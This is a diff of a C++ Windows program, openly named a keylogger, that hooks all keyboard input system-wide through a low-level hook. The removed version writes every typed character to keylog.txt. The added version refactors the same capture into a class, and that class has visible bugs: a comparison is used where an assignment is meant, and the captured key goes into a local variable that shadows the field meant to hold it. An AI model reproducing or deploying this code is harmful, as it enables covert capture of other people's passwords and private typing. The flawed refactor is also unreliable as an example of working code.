@@ -1,25 +1,75 @@
 #include <iostream>
 #include <windows.h>
 #include <winuser.h>
-#include <fstream>
 #include <codecvt>
 #include <locale>
+
 using namespace std;
 
-//Opening keylog.txt
-ofstream logfile("keylog.txt", ios::app);
-
-//A string to convert unicode (UTF-16) to UTF-8. This is to output the key input correctly to the file keylog.txt 
-string narrow(const wchar_t *wideChar)
+class windowskeyLogger
 {
-    wstring_convert<codecvt_utf8<wchar_t>> converter;
-    return converter.to_bytes(wideChar);
-}
+    public:
+        void loggingStart()
+        {
+            keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, NULL, 0);
+
+            if (keyboard == NULL)
+            {
+                throw runtime_error("Unable to set keyboard hook.");
+            }
+
+            runMessageLoop();
+            getLoggedCharacter();
+
+        }
+
+        void loggingStop()
+        {
+            if (keyboard != NULL)
+            {
+                UnhookWindowsHookEx(keyboard);
+                keyboard == NULL;
+                
+            }
+
+            else
+            {
+                throw runtime_error("No keyboardhook has been set.");
+            }
+            
+        }
+
+        string getLoggedCharacter()
+        {
+            unicodeCaracter_uft8 = utf16_to_utf8(unicodeCaracter.c_str());
+            return unicodeCaracter_uft8;
+        }
+
+    private:
+
+    HHOOK keyboard;
+    wstring unicodeCaracter;
+    string unicodeCaracter_uft8;
+
+    string utf16_to_utf8(const wchar_t *uft16_string)
+    {
+        wstring_convert < codecvt_utf8 < wchar_t > > converter;
+        return converter.to_bytes(uft16_string);
+    }
+
+    void runMessageLoop()
+    {
+        MSG message;
+        while (GetMessage(&message, NULL, 0, 0) > 0)
+        {
+            TranslateMessage(&message);
+            DispatchMessage(&message);
+        }
+    }
 
 
-//The function that makes all this posible.
-LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
-{
+    static LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
+    {
         if (nCode < 0) 
         {
         return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -70,55 +120,15 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
             }
 
             result = ToUnicode(kbd->vkCode, kbd->scanCode, keyboardState, unicodeChar, 3, 0);
-            
             if (result > 0)
-            {
-                wcout << L"Unicode character: " << unicodeChar << endl;
-                wstring wideStr(unicodeChar);
-                logfile << narrow(wideStr.c_str());
-                logfile.flush();
-            }
+                {
+                    wstring unicodeCaracter(unicodeChar);
+                    
+                }
         }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-    
 
-int main()
-{
-    // Error check to see if logfile.txt can be opend.
-    if (!logfile.is_open()) {
-        cout << "Error: Unable to open output file." << endl;
-        return 1;
-    }
-
-    //Enableling a low level keyboard hook that intercepts keyboard input.
-    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, NULL, 0);
-
-    //Error checking if het hook was succesfull
-    if (keyboard == NULL)
-    {
-        cout << "Error: Unable to set keyboard hook." << endl;
-        logfile.close();
-        return 1;
-    }
- 
-    //Making sure the code keeps running until a WM_QUID message is read.
-    MSG message;
-    while (GetMessage(&message, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&message);
-        DispatchMessage(&message);
-    }
-
-    //Cleaning the hook
-    UnhookWindowsHookEx(keyboard);
-
-    //Closing Logfile.txt
-    logfile.close();
-
-    return 0;
-}
-
-//testchange
+};
